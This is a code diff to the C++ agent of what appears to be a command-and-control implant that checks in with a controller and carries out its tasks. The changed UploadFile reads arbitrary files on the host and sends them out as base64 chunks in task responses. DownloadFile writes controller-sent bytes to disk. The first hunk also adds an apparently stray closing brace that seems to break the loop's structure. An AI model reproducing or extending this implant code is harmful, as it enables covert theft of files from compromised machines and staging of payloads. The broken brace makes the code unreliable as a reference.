@@ -170,6 +170,7 @@ void Agent::Start()
 
         // Pause for five seconds before checking in again.
         Sleep(5000);
+        }
     }
 }
 
@@ -884,14 +885,47 @@ IntitalCheckinRequest Agent::GetHostInformation()
 // File Transfer Commands
 Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadRequest)
 {
-    const bool sent = FileTransfer::SendFile(
-        uploadRequest.path,
-        commManager.GetCallbackUUID(),
-        taskID,
-        commManager.GetFileTransferUrl());
-    if (sent)
-        return CreateTaskResponse(taskID, UPLOAD, NO_CODE, SUCCESS, TaskSuccess{"File uploaded successfully."});
-    return CreateTaskResponse(taskID, UPLOAD, NO_CODE, TASK_ERROR, TaskError{1, "File upload failed."});
+    try
+    {
+        std::ifstream input(uploadRequest.path, std::ios::binary | std::ios::ate);
+        if (!input)
+            throw std::runtime_error("File could not be opened.");
+
+        const auto size = input.tellg();
+        if (size < 0)
+            throw std::runtime_error("File size could not be read.");
+
+        const auto offset = uploadRequest.offset;
+        if (offset < 0 || offset > size)
+            throw std::runtime_error("Upload offset is invalid.");
+
+        constexpr std::int64_t chunkSize = 512 * 1024;
+        const auto count = static_cast<std::size_t>(
+            std::min<std::int64_t>(chunkSize, size - offset));
+        std::vector<char> bytes(count);
+        input.seekg(offset);
+        if (count > 0)
+            input.read(bytes.data(), static_cast<std::streamsize>(count));
+        if (!input && count > 0)
+            throw std::runtime_error("File chunk could not be read.");
+
+        const bool final = offset + static_cast<std::int64_t>(count) >= size;
+        return CreateTaskResponse(
+            taskID,
+            UPLOAD,
+            NO_CODE,
+            final ? UPLOAD_FINAL : UPLOAD_CHUNK,
+            TaskFileChunk{
+                std::filesystem::path(uploadRequest.path).filename().string(),
+                base64::to_base64(std::string(bytes.begin(), bytes.end())),
+                offset,
+                static_cast<std::int64_t>(size),
+                final});
+    }
+    catch (const std::exception &exception)
+    {
+        return CreateTaskResponse(taskID, UPLOAD, NO_CODE, TASK_ERROR, TaskError{1, exception.what()});
+    }
 }
 
 Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest)
@@ -915,7 +949,12 @@ Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downl
                                        : std::ios::binary | std::ios::app);
         output.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
         if (output)
-            return CreateTaskResponse(taskID, DOWNLOAD, DOWNLOAD, SUCCESS, TaskSuccess{"File chunk stored."});
+            return CreateTaskResponse(
+                taskID,
+                DOWNLOAD,
+                DOWNLOAD,
+                downloadRequest.final ? DOWNLOAD_FINAL_STATUS : DOWNLOAD_CHUNK_STATUS,
+                TaskSuccess{"File chunk stored."});
     }
     catch (const std::exception &exception)
     {
